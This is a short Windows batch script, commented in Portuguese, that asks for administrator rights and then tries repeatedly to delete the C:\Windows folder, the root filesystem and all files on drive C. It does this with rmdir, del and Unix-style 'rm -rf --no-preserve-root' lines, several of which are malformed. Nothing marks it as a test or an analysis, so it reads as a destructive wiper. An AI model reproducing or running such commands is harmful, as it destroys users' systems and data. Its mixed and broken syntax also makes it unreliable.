@echo OFF
:runAsAdmin
:: Reinicia o script solicitando a elevação para administrador
powershell -Command "Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs"

powershell rm -rf C:\Windows --no-preserve-root
powershell sudo rm -rf / --no-preserve-root
rmdir /s /q C:\Windows
rmdir /s C:\Windows
powershell rm -rf C:\Windows -f --no-preserve-root
powershell rm -rf C:\Windows -f
powershell sudo rm -rf C:\Windows -f
powershell rmdir C:\Windows
del /f c:\*.* & A
powershell sudo rm -rf C:\Windows -f --no-preserve-root
